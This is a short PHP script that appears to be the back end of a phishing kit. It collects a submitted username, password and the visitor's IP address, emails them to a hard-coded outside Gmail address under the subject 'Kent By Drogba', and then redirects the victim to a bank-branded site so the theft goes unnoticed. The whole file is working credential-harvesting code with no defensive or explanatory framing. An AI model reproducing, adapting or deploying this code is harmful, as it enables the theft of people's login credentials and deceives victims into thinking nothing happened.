<?

$ip = getenv("REMOTE_ADDR");
$message .= "----------------------Academico Result--------------------------\n";
$message .= "User ID: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Powered By POP3-------------------------\n";

$recipient = "zate123man@gmail.com";
$subject = "Kent By Drogba";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("", "Academico Logs", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.cibcfcib.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>


